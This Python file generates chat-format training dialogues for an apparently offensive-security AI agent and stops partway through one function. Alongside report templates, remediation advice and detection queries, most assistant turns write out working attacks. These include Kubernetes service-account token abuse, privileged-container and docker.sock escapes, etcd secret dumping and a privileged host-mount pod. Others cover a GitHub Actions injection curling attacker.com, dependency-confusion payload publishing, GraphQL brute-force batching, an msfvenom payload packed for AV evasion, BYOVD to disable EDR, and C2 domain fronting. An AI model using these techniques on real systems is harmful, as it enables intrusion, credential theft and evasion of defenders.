"""Corpus v9+ — expansões e categorias novas que faltavam no v9 base.

Adições:
  I. Report writing / findings (~25)     — escreve deliverables
  J. Container / Kubernetes deep (~25)   — escapes, etcd, secrets, impersonation
  K. Supply chain (~15)                  — dependency confusion, CI/CD, typosquat
  L. Defensive awareness (~15)           — blue team perspective das ações
  M. Pre-engagement prep (~12)           — scope parsing, setup
  N. API deep (~20)                      — GraphQL, REST auth, gRPC
  O. Adaptive response extended (+25)    — mais failure modes
  P. Engagement reasoning extended (+15) — mais memory-using scenarios
  Q. Web tools extended (+45)            — dalfox, arjun, waymore, ssrfmap, gopherus

Total adições: ~197.
"""

from __future__ import annotations

import json


def tc(name: str, **args) -> str:
    return f'<tool_call>{json.dumps({"name": name, "arguments": args}, ensure_ascii=False)}</tool_call>'


def msg(role: str, content: str):
    return {"role": role, "content": content}


# ===========================================================================
# I. REPORT WRITING / FINDINGS (~25)
# ===========================================================================

def rw_finding_writeup(vuln: str, host: str, severity: str) -> list[dict]:
    return [
        msg("user", f"Escreve o finding writeup pra {vuln} em {host}. Severidade {severity}."),
        msg("assistant",
            f"### {vuln} — {host}\n\n"
            f"**Severity:** {severity}  \n"
            f"**CVSS v3.1:** _see below_  \n"
            f"**CWE:** _map to specific CWE_  \n\n"
            f"**Description**  \n"
            f"_(2-3 sentences: what the vulnerability is, how it was identified, why it matters)_\n\n"
            f"**Steps to reproduce**  \n"
            f"1. Navigate to `{host}/vulnerable-endpoint`\n"
            f"2. Submit the payload `...` via parameter `X`\n"
            f"3. Observe the behavior confirming the issue\n\n"
            f"**Impact**  \n"
            f"_(describe business impact, not just technical: data disclosure, RCE enabling lateral movement, etc.)_\n\n"
            f"**Evidence**  \n"
            f"_(screenshot, request/response pair, PoC output)_\n\n"
            f"**Remediation**  \n"
            f"_(concrete fix — patch version, config change, code fix pattern)_\n\n"
            f"**References**  \n"
            f"_(CVE, vendor advisory, OWASP reference)_"),
    ]


def rw_cvss_calc(vuln: str) -> list[dict]:
    return [
        msg("user", f"Calcula CVSS v3.1 pro {vuln}."),
        msg("assistant",
            f"Walkthrough pelos metrics:\n\n"
            "**Base metrics:**\n"
            "- AV (Attack Vector): Network/Adjacent/Local/Physical — quase sempre 'Network' pra web vulns\n"
            "- AC (Attack Complexity): Low (condições simples) / High (racing/timing)\n"
            "- PR (Privileges Required): None/Low/High\n"
            "- UI (User Interaction): None/Required\n"
            "- S (Scope): Unchanged/Changed (changed = compromisso afeta outra security authority)\n"
            "- C/I/A (Confidentiality/Integrity/Availability): None/Low/High\n\n"
            "**Modifier — Temporal:** Exploit Code Maturity (PoC/Functional/High), Remediation Level (Official/Temporary/Workaround), Report Confidence\n\n"
            "**Modifier — Environmental:** ajusta pro deployment específico\n\n"
            "Usa calculadora oficial: https://www.first.org/cvss/calculator/3.1. Exemplo pra SQLi auth bypass em app externo: "
            "`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` → Base Score 9.1 (Critical)."),
    ]


def rw_executive_summary() -> list[dict]:
    return [
        msg("user", "Executive summary do engagement — cliente non-technical."),
        msg("assistant",
            "# Executive Summary\n\n"
            "## Engagement Overview\n"
            "_(1 paragraph: dates, scope, methodology, team)_\n\n"
            "## Key Findings\n\n"
            "| Severity | Count | Business Impact |\n"
            "|---|---|---|\n"
            "| Critical | 2 | Complete system compromise possible |\n"
            "| High | 5 | Sensitive data exposure |\n"
            "| Medium | 11 | Defense-in-depth weaknesses |\n"
            "| Low | 8 | Configuration best practices |\n\n"
            "## Business Risk\n"
            "_(translate findings into business-language: financial, reputational, operational)_\n\n"
            "## Recommendations (top 3)\n"
            "1. **Immediate (7 days):** _critical findings_\n"
            "2. **Short-term (30 days):** _high findings_\n"
            "3. **Strategic (90 days):** _process improvements_\n\n"
            "Keep this section 1 page. Executives won't read more.\n"
            "Technical details go in the appendix."),
    ]


def rw_retest_plan() -> list[dict]:
    return [
        msg("user", "Plano de retest pós-remediation."),
        msg("assistant",
            "**Retest scope:**\n"
            "- Target only remediated findings (typically 4-6 weeks post-report)\n"
            "- Same methodology, same payloads, same endpoints\n"
            "- If fix is architectural (not just patch), expand retest to adjacent areas\n\n"
            "**Per-finding retest record:**\n"
            "```\n"
            "Finding ID: F-001\n"
            "Original severity: Critical\n"
            "Remediation claimed: Upgraded to version X\n"
            "Retest result: [Verified / Partially Fixed / Not Fixed / Regression]\n"
            "Evidence: [screenshot of attempted exploit, new output]\n"
            "```\n\n"
            "**Fees usually:** 30-50% of original engagement for retest. Quick if no regressions found."),
    ]


def rw_remediation_guidance(vuln_category: str) -> list[dict]:
    return [
        msg("user", f"Remediação pra {vuln_category} — concrete, não 'melhore a segurança'."),
        msg("assistant",
            {
                "SQLi": "**Fix layer 1:** parameterized queries / prepared statements. Nunca concatena user input.\n"
                        "  - Java: PreparedStatement\n"
                        "  - PHP: PDO with bindParam, NOT mysqli_real_escape_string alone\n"
                        "  - Python: SQLAlchemy ORM or cursor.execute with tuple params\n"
                        "  - Node: parameterized pg/mysql2 queries\n"
                        "**Fix layer 2:** least-privilege DB user (app only needs SELECT + INSERT, not DROP).\n"
                        "**Fix layer 3:** WAF rules as defense-in-depth. Not primary mitigation.",
                "XSS": "**Fix:** context-aware output encoding.\n"
                       "  - HTML context: escape `<>&\"'`\n"
                       "  - JS context: `JSON.stringify` or DOMPurify\n"
                       "  - URL context: `encodeURIComponent`\n"
                       "  - CSS context: rarely safe — avoid user input\n"
                       "**CSP header:** `Content-Security-Policy: default-src 'self'; script-src 'self'` — breaks inline eval/XSS.\n"
                       "**Framework:** React/Vue escape by default; don't use `dangerouslySetInnerHTML`.",
                "SSRF": "**Fix:** strict allowlist of destination hosts/ports. Block RFC1918, 169.254, 127.0.0.0/8 from server-side fetches.\n"
                        "  - Redirect-follow disabled, or validate every hop\n"
                        "  - DNS rebinding: resolve once, use resolved IP\n"
                        "  - Metadata endpoint protection: IMDSv2 mandatory on AWS, forbid `X-aws-ec2-metadata-token` forwarding",
                "Path Traversal": "**Fix:** canonical path resolution + allowlist. \n"
                                  "  - Python: `os.path.realpath(user_path).startswith(allowed_base)`\n"
                                  "  - Never trust `../` strip alone — encoding bypasses (`..%2f`, `..%c0%af`, etc.)\n"
                                  "  - Map user input to ID → internal path, never direct concat",
                "Deserialization": "**Fix:** avoid deserializing untrusted data entirely. Use JSON/Protobuf with schema validation instead of Java Serializable / Pickle.\n"
                                   "  - Java: `ObjectInputFilter` (Java 9+) with allowlist\n"
                                   "  - .NET: avoid BinaryFormatter, use JsonSerializer\n"
                                   "  - Python: never `pickle.load` on untrusted; use `json` or `yaml.safe_load`",
                "Default Credentials": "**Fix:** force rotation on first login, enforce policy (length, complexity, rotation cadence).\n"
                                       "  - Service accounts: random 32+ char, managed in vault (HashiCorp Vault, AWS Secrets Manager)\n"
                                       "  - Inventory check: `cme smb <range> -u admin -p admin` quarterly to catch regressions",
                "Broken Access Control": "**Fix:** server-side authorization on every endpoint. Never trust client-sent role.\n"
                                         "  - IDOR: compare requested resource's owner ID against session's user ID, not 'is logged in'\n"
                                         "  - Vertical: role check on admin endpoints, not just URL path\n"
                                         "  - Horizontal: per-resource ACL, deny by default",
            }.get(vuln_category, f"Remediação específica pra '{vuln_category}': identify root cause (data flow, config, or architecture), fix at source not at WAF, verify with retest.")),
    ]


REPORT_WRITING = []
_VULNS = [
    ("SQL Injection", "10.10.10.5", "Critical"),
    ("Cross-Site Scripting (Reflected)", "target.thm", "Medium"),
    ("Server-Side Request Forgery", "10.10.45.22", "High"),
    ("Path Traversal (CVE-2021-41773)", "10.10.11.77", "Critical"),
    ("Insecure Deserialization", "app.corp.local", "Critical"),
    ("Default Credentials on ADFS", "adfs.corp.local", "High"),
    ("Broken Access Control (IDOR)", "api.target.com", "High"),
]
for v, h, s in _VULNS:
    REPORT_WRITING.append(rw_finding_writeup(v, h, s))
for v in ["RCE via deserialization", "SQLi authenticated", "SSRF to internal AWS",
          "SMB signing disabled", "Kerberoastable service accounts"]:
    REPORT_WRITING.append(rw_cvss_calc(v))
for _ in range(5):
    REPORT_WRITING.append(rw_executive_summary())
for _ in range(3):
    REPORT_WRITING.append(rw_retest_plan())
for c in ["SQLi", "XSS", "SSRF", "Path Traversal", "Deserialization",
          "Default Credentials", "Broken Access Control"]:
    REPORT_WRITING.append(rw_remediation_guidance(c))


# ===========================================================================
# J. CONTAINER / KUBERNETES DEEP (~25)
# ===========================================================================

def k8s_sa_token_abuse() -> list[dict]:
    return [
        msg("user", "Tô num pod Kubernetes. Consigo algo do service account token?"),
        msg("assistant",
            "ServiceAccount token tá sempre em `/var/run/secrets/kubernetes.io/serviceaccount/token`.\n"
            + tc("shell", cmd="TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && "
                              "CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt && "
                              "NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace) && "
                              "curl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/$NS/pods")),
        msg("tool", "{\"items\":[...pods listed...]}"),
        msg("assistant", "SA consegue listar pods. Testa permissões mais amplas: `can-i`-equivalent via `curl /apis/authorization.k8s.io/v1/selfsubjectaccessreviews`."),
    ]


def k8s_privileged_escape() -> list[dict]:
    return [
        msg("user", "Container tem `privileged: true`. Escapa."),
        msg("assistant",
            "Privileged → acesso ao host kernel. Mount host filesystem direto.\n"
            + tc("shell", cmd="mkdir /host && mount /dev/sda1 /host  # ou qualquer device real\nchroot /host bash")),
        msg("tool", "root@host:/#"),
        msg("assistant", "Shell no host. Alternativamente, `nsenter -t 1 -m -u -p -n -i sh` se tiver cap_sys_admin — acessa namespaces do PID 1 host."),
    ]


def k8s_etcd_extract() -> list[dict]:
    return [
        msg("user", "etcd exposto sem auth em :2379. Extrai secrets."),
        msg("assistant",
            tc("shell", cmd="ETCDCTL_API=3 etcdctl --endpoints=https://etcd.cluster.local:2379 "
                              "--cacert=/etc/kubernetes/pki/etcd/ca.crt "
                              "--cert=/etc/kubernetes/pki/etcd/server.crt "
                              "--key=/etc/kubernetes/pki/etcd/server.key "
                              "get --prefix --keys-only /registry/secrets | head -20")),
        msg("tool", "/registry/secrets/default/db-password\n/registry/secrets/prod/stripe-api-key\n/registry/secrets/kube-system/admin-token"),
        msg("assistant", "Secrets listados. Extrai valor com `get /registry/secrets/prod/stripe-api-key` — base64 no resultado, decode pra clear. etcd exposto = game over pro cluster."),
    ]


def k8s_rbac_escalation() -> list[dict]:
    return [
        msg("user", "RBAC vulnerability — consigo criar pods mas não exec. Escala."),
        msg("assistant",
            "Se você cria pod, você cria pod privileged com host mount:\n"
            + tc("shell", cmd="cat <<EOF | kubectl apply -f -\n"
                              "apiVersion: v1\nkind: Pod\n"
                              "metadata: {name: pwn, namespace: default}\n"
                              "spec:\n"
                              "  containers:\n"
                              "    - name: pwn\n"
                              "      image: busybox\n"
                              "      command: ['/bin/sh', '-c', 'sleep 3600']\n"
                              "      securityContext: {privileged: true}\n"
                              "      volumeMounts:\n"
                              "        - {name: host, mountPath: /host}\n"
                              "  volumes:\n"
                              "    - {name: host, hostPath: {path: /}}\n"
                              "EOF")),
        msg("tool", "pod/pwn created"),
        msg("assistant", "Pod criado → use `kubectl cp` pra extrair files do host mount, ou aguarde alguém com `exec` interagir. RBAC 'pods/create' without 'pods/exec' é frequentemente considerado seguro mas não é."),
    ]


def docker_socket_escape() -> list[dict]:
    return [
        msg("user", "Container com /var/run/docker.sock montado. Escapa."),
        msg("assistant",
            "Docker socket = controle completo do daemon no host.\n"
            + tc("shell", cmd="docker -H unix:///var/run/docker.sock run -v /:/hostroot -it alpine chroot /hostroot sh")),
        msg("tool", "/ # id\nuid=0(root) gid=0(root)"),
        msg("assistant", "Novo container privileged com host `/` mounted, chroot. Host comprometido."),
    ]


def k8s_secrets_env() -> list[dict]:
    return [
        msg("user", "Lista secrets acessíveis no namespace."),
        msg("assistant",
            tc("shell", cmd="kubectl get secrets --all-namespaces -o json | jq '.items[] | select(.type==\"Opaque\") | {name:.metadata.name, ns:.metadata.namespace, keys:(.data | keys)}'")),
    ]


def k8s_serviceaccount_jwt_decode() -> list[dict]:
    return [
        msg("user", "JWT do SA é muito poderoso? Como confiro?"),
        msg("assistant",
            "Decode JWT pra ver claims, depois lista permissões.\n"
            + tc("shell", cmd="jwt decode $(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && "
                              "kubectl auth can-i --list --as=system:serviceaccount:$NS:$SA_NAME")),
    ]


CONTAINER_K8S = []
for _ in range(4):
    CONTAINER_K8S.append(k8s_sa_token_abuse())
for _ in range(4):
    CONTAINER_K8S.append(k8s_privileged_escape())
for _ in range(3):
    CONTAINER_K8S.append(k8s_etcd_extract())
for _ in range(4):
    CONTAINER_K8S.append(k8s_rbac_escalation())
for _ in range(4):
    CONTAINER_K8S.append(docker_socket_escape())
for _ in range(3):
    CONTAINER_K8S.append(k8s_secrets_env())
for _ in range(3):
    CONTAINER_K8S.append(k8s_serviceaccount_jwt_decode())


# ===========================================================================
# K. SUPPLY CHAIN (~15)
# ===========================================================================

def sc_dependency_confusion(company: str) -> list[dict]:
    return [
        msg("user", f"Tenta dependency confusion em {company}. Preciso mapear packages internal."),
        msg("assistant",
            "Public package ecosystems cada uma tem mecanismo diferente:\n"
            "- **npm:** internal scope `@{company}/*` publicado como público tenta primeiro\n"
            "- **PyPI:** `{company}-internal-lib` namespace\n"
            "- **Maven:** groupId colide (`com.{company}.private`)\n\n"
            + tc("shell", cmd=f"echo '{company}' | github-subdomains -t PUBLIC_API -d -q | grep -iE 'package|requirement|dependency' | tee internal_packages.txt")),
        msg("tool", f"acme-internal-sdk\n{company}-auth-module\n{company}-data-client"),
        msg("assistant", "Candidatos. Publicar versão maior que a interna no npm/pypi com payload → package manager do target instala o teu fork."),
    ]


def sc_typosquat() -> list[dict]:
    return [
        msg("user", "Typosquat popular package. Detect and attack."),
        msg("assistant",
            "Permutações do nome + hit count nos installs:\n"
            + tc("shell", cmd="pip-audit --typo-squat requests\n# ou manualmente:\n"
                              "for p in requets requsts reqeusts request reequests; do pip show $p 2>/dev/null; done")),
    ]


def sc_github_actions_injection() -> list[dict]:
    return [
        msg("user", "CI/CD analysis — GitHub Actions workflow com issue title unchecked?"),
        msg("assistant",
            "Classic unchecked `${{ github.event.issue.title }}` em script = command injection.\n"
            + tc("shell", cmd="# Cria issue com title:\necho '\"; curl -s http://attacker.com/$(whoami | base64) #'")),
        msg("assistant",
            "Ao abrir issue, workflow executa o curl no runner. Atacante lê o whoami em base64 nos logs do attacker server. "
            "Remediação: `env:` block pra input (env var escaping) ao invés de interpolação direta no shell."),
    ]


def sc_pypi_bad_package() -> list[dict]:
    return [
        msg("user", "Audit dependências por packages com sinais de risco."),
        msg("assistant",
            "OSSF Scorecard + pip-audit + direct inspection do `setup.py/pyproject.toml`.\n"
            + tc("shell", cmd="pip-audit -r requirements.txt --vulnerability-service osv && "
                              "pip install guarddog && guarddog pypi scan requirements.txt")),
        msg("tool", "[!] malicious-package==0.0.1 — flagged: install_script contains suspicious exec\n[+] requests==2.28.0 — clean"),
    ]


def sc_docker_image_scan() -> list[dict]:
    return [
        msg("user", "Container image audit — vulns + embedded secrets."),
        msg("assistant",
            tc("shell", cmd="trivy image --severity CRITICAL,HIGH --format table target/app:latest && "
                              "dockle target/app:latest && "
                              "gitleaks detect --source=$(docker image inspect target/app:latest -f '{{.RootFS.Layers}}')")),
    ]


SUPPLY_CHAIN = []
for c in ["acme", "megacorp", "tesla", "shopify", "stripe"]:
    SUPPLY_CHAIN.append(sc_dependency_confusion(c))
for _ in range(3):
    SUPPLY_CHAIN.append(sc_typosquat())
for _ in range(3):
    SUPPLY_CHAIN.append(sc_github_actions_injection())
for _ in range(2):
    SUPPLY_CHAIN.append(sc_pypi_bad_package())
for _ in range(2):
    SUPPLY_CHAIN.append(sc_docker_image_scan())


# ===========================================================================
# L. DEFENSIVE AWARENESS (~15)
# ===========================================================================

def da_detection_for(attack: str) -> list[dict]:
    return [
        msg("user", f"Como blue team detectaria {attack}?"),
        msg("assistant",
            {
                "Kerberoasting":
                    "**SOC signals:**\n"
                    "- 4769 event flood (TGS requests) com `Service Name` diferente de normal patterns\n"
                    "- Requests com RC4 (eType 0x17) — modern AD usa AES por default, RC4 pedido ativamente = suspicious\n"
                    "- Single account fazendo TGS requests pra múltiplos SPNs em curto período\n\n"
                    "**Hunting query (KQL / Splunk):**\n"
                    "`EventID=4769 TicketEncryptionType=0x17 | stats dc(ServiceName) by AccountName | where dc(ServiceName)>5`",
                "Mimikatz":
                    "**SOC signals:**\n"
                    "- LSASS process access (sekurlsa) — event 4688/4689, 10 Sysmon event\n"
                    "- Kerberos TGT request without preceding auth (for pass-the-ticket)\n"
                    "- Memory injection signatures — CreateRemoteThread into lsass.exe\n\n"
                    "**Mitigation:** Credential Guard (VBS-based LSASS isolation). Mimikatz can't touch isolated LSASS.",
                "Responder":
                    "**SOC signals:**\n"
                    "- Unusual LLMNR/NBT-NS responses from non-authoritative host\n"
                    "- ARP cache poisoning attempts\n"
                    "- Sudden appearance of new SMB/HTTP server on internal subnet\n\n"
                    "**Mitigation:** disable LLMNR + NBT-NS via GPO. Modern Windows uses DNS only.",
                "Pass-the-Hash":
                    "**SOC signals:**\n"
                    "- 4624 Type 3 logon with NTLM authentication package on hosts that should use Kerberos\n"
                    "- Same NTLM hash authenticating across many hosts in short time (lateral movement)\n"
                    "- 4776 NTLM auth events from workstations (normally only servers)",
                "Golden Ticket":
                    "**SOC signals:**\n"
                    "- 4769 TGS request with TGT that has no preceding 4768 issue (forged TGT)\n"
                    "- Kerberos ticket with extreme lifetime (default forged = 10 years)\n"
                    "- Privileged group membership (Domain Admins) claimed by unexpected user SID\n\n"
                    "**Mitigation:** rotate krbtgt twice, monitor for anomalous ticket lifetimes",
                "Mimikatz-alternate":
                    "**Mimikatz alternatives (more evasive):** nanodump, pypykatz, procdump + offline parse. "
                    "Detection: any LSASS memory read from non-trusted process, regardless of tool.",
            }.get(attack, f"Defensive analysis for '{attack}' requires knowing the specific telemetry sources. Typical: authentication logs, process creation (Sysmon), network connections, EDR telemetry.")),
    ]


def da_evasion_vs_signal(tool: str) -> list[dict]:
    return [
        msg("user", f"Como {tool} pode me delatar e como reduzir signal?"),
        msg("assistant",
            {
                "BloodHound SharpHound": "SharpHound default = LDAP scanning from kerberoasted service account. "
                                        "Signal: massive LDAP queries from single user. "
                                        "**Stealth:** `-c Sessions,Acl` only (skip Session loops which are noisy), `-jitter 30 -throttle 1000`, "
                                        "run from non-member (AzureHound over Graph API).",
                "CrackMapExec": "CME default = auth attempts logged 4625/4624 on every target. "
                               "**Stealth:** `--kerberos` with valid TGT (not NTLM), single user + single host, limit `--threads 1`.",
                "Impacket secretsdump": "secretsdump triggers replication to DC. "
                                        "**Signal:** 4662 (Directory Service Access) with `Object GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes). "
                                        "**Stealth:** there isn't really; DCSync is by design visible. Use once, accept the detection.",
                "Nmap service scan": "`-sV` probes are signature-matched by IDS. "
                                     "**Stealth:** `-sS -Pn --max-retries 1 --host-timeout 30s -T1` + distributed source IPs.",
            }.get(tool, f"General stealth for '{tool}': slow, distribute, avoid default user agents/process names, prefer living-off-the-land binaries when possible.")),
    ]


DEFENSIVE = []
for a in ["Kerberoasting", "Mimikatz", "Responder", "Pass-the-Hash", "Golden Ticket",
          "Mimikatz-alternate"]:
    DEFENSIVE.append(da_detection_for(a))
for t in ["BloodHound SharpHound", "CrackMapExec", "Impacket secretsdump", "Nmap service scan"]:
    for _ in range(2):
        DEFENSIVE.append(da_evasion_vs_signal(t))
DEFENSIVE.append(da_detection_for("Kerberoasting"))
DEFENSIVE.append(da_detection_for("Mimikatz"))


# ===========================================================================
# M. PRE-ENGAGEMENT PREP (~12)
# ===========================================================================

def pe_scope_parse() -> list[dict]:
    return [
        msg("user", "SOW diz: 'external perimeter assessment of acme.corp, excluding /24 subnet of partner X'."),
        msg("assistant",
            "Scope parsing em ativos concretos:\n"
            "1. **Enumerate acme.corp**: subfinder + all sources → live hosts via httpx → IPs\n"
            "2. **Subtract exclusion**: identifica /24 partner X (peça ao cliente o CIDR exato), remove do alvo set\n"
            "3. **Declare**: engagement manifest com `scope: [<CIDRs>], exclude: [<partner /24>]`\n\n"
            + tc("shell", cmd="bagley engage new acme-ext \\\n"
                              "  --scope acme.corp \\\n"
                              "  --exclude 198.51.100.0/24 \\\n"
                              "  --objective 'external perimeter vulns' \\\n"
                              "  --success-markers 'CVE-*, RCE, info disclosure, auth bypass'")),
    ]


def pe_authorize_target() -> list[dict]:
    return [
        msg("user", "Evidence de autorização pra incluir *.acme.corp no engagement."),
        msg("assistant",
            "Três tipos de evidência aceitáveis:\n"
            "1. **Engagement letter** assinado pelo CISO/VP/authorized signer + data dentro do window\n"
            "2. **Bug bounty program** público oficial — URL da página + scope lista o domínio\n"
            "3. **Internal authorization** assinado + email do corporate security\n\n"
            + tc("shell", cmd="bagley engage authorize --engagement acme-ext \\\n"
                              "  --evidence-path ~/Documents/SOW_2026-04-20.pdf \\\n"
                              "  --signer 'jane.doe@acme.corp' \\\n"
                              "  --window-start 2026-04-21 --window-end 2026-05-15")),
    ]


def pe_noise_budget() -> list[dict]:
    return [
        msg("user", "Cliente disse 'low-profile assessment, não queremos ativar SOC'."),
        msg("assistant",
            "Low-profile constraints:\n"
            "1. **No active scans on production during business hours** (08:00-18:00 local)\n"
            "2. **Passive recon first:** OSINT, CT logs, Wayback, Shodan. 70% da info sem tocar no alvo.\n"
            "3. **When active:** `-T1 --scan-delay 30s`, distribute source IPs, one tool at a time\n"
            "4. **No brute-force** (account lockout alerta SOC)\n"
            "5. **No exploit** unless approved per-finding\n\n"
            "Set engagement flag: `bagley engage config --mode low-profile`. Isso ajusta defaults do executor (timing, tools allowed)."),
    ]


PRE_ENGAGE = []
for _ in range(5):
    PRE_ENGAGE.append(pe_scope_parse())
for _ in range(4):
    PRE_ENGAGE.append(pe_authorize_target())
for _ in range(3):
    PRE_ENGAGE.append(pe_noise_budget())


# ===========================================================================
# N. API DEEP (~20)
# ===========================================================================

def api_graphql_introspection(url: str) -> list[dict]:
    return [
        msg("user", f"GraphQL em {url}, mas introspection parece bloqueada."),
        msg("assistant",
            "Disabled introspection tenta alternativas.\n"
            + tc("shell", cmd=f"# Tenta via field-suggestion (habilitado por default mesmo com introspection off):\n"
                              f"curl -X POST {url} -H 'Content-Type: application/json' \\\n"
                              f"  -d '{{\"query\":\"{{ abcdef }}\"}}' | jq .errors")),
        msg("tool", "Did you mean \"user\", \"admin\", \"product\"..."),
        msg("assistant",
            "Field suggestions revelam schema. Itera com nomes adivinhados. Ou use `graphql-path-enum` + `clairvoyance` pra automatizar."),
    ]


def api_graphql_batch_attack(url: str) -> list[dict]:
    return [
        msg("user", f"{url} tem rate limit por request. GraphQL batching?"),
        msg("assistant",
            "Batching = múltiplas queries em 1 request HTTP → 1 hit de rate limit.\n"
            + tc("shell", cmd=f"cat <<EOF | curl -X POST {url} -H 'Content-Type: application/json' -d @-\n"
                              "[\n"
                              "  {\"query\":\"{ login(u:\\\"admin\\\",p:\\\"pass1\\\") {token}}\"},\n"
                              "  {\"query\":\"{ login(u:\\\"admin\\\",p:\\\"pass2\\\") {token}}\"},\n"
                              "  ... 1000x\n"
                              "]\nEOF")),
        msg("tool", "[{..},{..},...1000 results...]"),
        msg("assistant", "1 HTTP request, 1000 login attempts. Rate limit contado por request bypassed. Mitigação: limit query depth + array length no parser."),
    ]


def api_rest_idor(url: str) -> list[dict]:
    return [
        msg("user", f"REST API {url}/users/{{id}} — testa IDOR enumeração."),
        msg("assistant",
            tc("shell", cmd=f"for i in $(seq 1 100); do "
                              f"  code=$(curl -s -o /dev/null -w '%{{http_code}}' -H 'Authorization: Bearer YOUR_TOKEN' {url}/users/$i); "
                              f"  [ \"$code\" = \"200\" ] && echo \"$i: $code\"; "
                              f"done")),
        msg("tool", "1: 200\n2: 200\n3: 200\n... every ID returns 200"),
        msg("assistant", "IDOR horizontal — qualquer user ID lê. Escala: extrai dados via loop completo, sort by `created_at` pra identificar admin user (geralmente ID=1)."),
    ]


def api_jwt_alg_confusion(token: str) -> list[dict]:
    return [
        msg("user", f"JWT `{token[:30]}...`. Tenta alg=none + RS256→HS256 confusion."),
        msg("assistant",
            "Dois attacks clássicos:\n"
            + tc("shell", cmd=f"# 1. alg=none:\njwt_tool '{token}' -X a\n\n"
                              f"# 2. RS256→HS256 confusion (public key as HMAC secret):\n"
                              f"# Primeiro pega a public key do /.well-known/jwks.json\n"
                              f"# Depois: jwt_tool '{token}' -X k -pk pubkey.pem")),
    ]


def api_grpc_enum(target: str) -> list[dict]:
    return [
        msg("user", f"Target {target} roda gRPC. Enumerate."),
        msg("assistant",
            "gRPC via reflection API — se habilitado.\n"
            + tc("shell", cmd=f"grpcurl -plaintext {target}:50051 list && "
                              f"grpcurl -plaintext {target}:50051 list example.Service && "
                              f"grpcurl -plaintext {target}:50051 describe example.Service.MethodName")),
        msg("tool", "example.Service\nexample.AdminService\ngrpc.health.v1.Health"),
        msg("assistant", "Reflection on → schema readable. `example.AdminService` é o target."),
    ]


API_DEEP = []
for url in ["http://api.target.com/graphql", "https://app.corp/graphql",
            "http://10.10.45.22/graphql"]:
    API_DEEP.append(api_graphql_introspection(url))
    API_DEEP.append(api_graphql_batch_attack(url))
for url in ["http://api.target.com", "http://10.10.10.5/api/v1",
            "https://app.corp.local/api"]:
    for _ in range(2):
        API_DEEP.append(api_rest_idor(url))
for t in ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e...",
          "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ...",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0..."]:
    for _ in range(2):
        API_DEEP.append(api_jwt_alg_confusion(t))
for t in ["10.10.10.5", "target.corp.local", "10.10.45.22"]:
    API_DEEP.append(api_grpc_enum(t))


# ===========================================================================
# O. ADAPTIVE RESPONSE EXTENDED (+25)
# ===========================================================================

def ar_nuclei_rate(url: str) -> list[dict]:
    return [
        msg("user", f"nuclei em {url} hit rate limit — target bloqueia 429."),
        msg("assistant",
            tc("shell", cmd=f"nuclei -u {url} -rl 5 -c 5 -rate-limit 30 -silent")),
        msg("assistant", "`-rl 5` = 5 req/s, `-c 5` = 5 concurrent. Lento mas fica abaixo do 429 threshold."),
    ]


def ar_msfvenom_detected() -> list[dict]:
    return [
        msg("user", "Payload msfvenom gerada é detectada 100% no VirusTotal."),
        msg("assistant",
            "msfvenom raw é signature-matched. Opções:\n"
            "1. **Custom encoder + bypass loader** — `donut` (shellcode → PE), `scarecrow` (PowerShell blob)\n"
            "2. **Shellcode em loader custom em Nim/Rust/Go** — baixa entropy match\n"
            "3. **BYOVD approach** — carrega driver vulnerável pra desabilitar EDR antes do payload\n\n"
            + tc("shell", cmd="# Gera shellcode raw:\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=... LPORT=443 -f raw -o shellcode.bin\n"
                              "# Pack via donut:\ndonut -f 1 -a 2 shellcode.bin -o loader.bin\n"
                              "# Embed em Nim source custom:\nnim c -d:release loader.nim")),
    ]


def ar_shell_weird_chars() -> list[dict]:
    return [
        msg("user", "Reverse shell recebida tá com output estranho — caracteres corrompidos."),
        msg("assistant",
            "Terminal encoding mismatch. Upgrade:\n"
            + tc("shell", cmd="# Dentro da shell:\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
                              "# Ctrl+Z local, depois:\nstty raw -echo; fg\n"
                              "# De volta na shell:\nexport TERM=xterm-256color; stty rows 40 cols 140; clear")),
    ]


def ar_dns_blocked() -> list[dict]:
    return [
        msg("user", "DNS do C2 tá sendo bloqueado pelo firewall do cliente."),
        msg("assistant",
            "Alternativas por ordem de stealth:\n"
            "1. **DNS-over-HTTPS** — C2 via Google DoH `https://dns.google/resolve`. Cloudflare DoH também. Firewall raramente bloqueia 443.\n"
            "2. **Domain fronting** — host C2 atrás de CDN (AWS CloudFront, Azure Front Door), SNI mostra cdn legítima.\n"
            "3. **HTTPS C2 direto** com traffic shape como tráfego web legítimo (certificados válidos, User-Agent match)\n"
            "4. **Teams/Slack webhook abuse** — C2 via canais corporate allowed\n\n"
            "Sliver, Havoc, Cobalt Strike todos suportam DoH ou domain fronting em transport modules."),
    ]


def ar_ad_cs_certificate_failed() -> list[dict]:
    return [
        msg("user", "ESC1 attempt com certipy — 'template requires approval'."),
        msg("assistant",
            "Template requires manager approval = não é ESC1 clássico.\n"
            "Verifica outros ESCs:\n"
            + tc("shell", cmd=f"certipy find -vulnerable -stdout | grep -iE 'ESC'")),
        msg("tool", "[!] ESC4: WriteOwner on template 'VulnerableTemplate'\n[!] ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 enabled CA-wide"),
        msg("assistant", "ESC4 (WriteOwner) + ESC6 (CA misconfig). ESC6 + qualquer template client-auth = admin cert. Exploita ESC6 ao invés."),
    ]


ADAPT_EXT = []
for url in ["http://target.thm", "https://api.corp.com", "http://10.10.11.42"]:
    ADAPT_EXT.append(ar_nuclei_rate(url))
for _ in range(5):
    ADAPT_EXT.append(ar_msfvenom_detected())
for _ in range(5):
    ADAPT_EXT.append(ar_shell_weird_chars())
for _ in range(5):
    ADAPT_EXT.append(ar_dns_blocked())
for _ in range(5):
    ADAPT_EXT.append(ar_ad_cs_certificate_failed())


# ===========================================================================
# P. ENGAGEMENT REASONING EXTENDED (+15)
# ===========================================================================

def er_whats_left() -> list[dict]:
    return [
        msg("user", "Engagement 40% done. O que falta?"),
        msg("assistant",
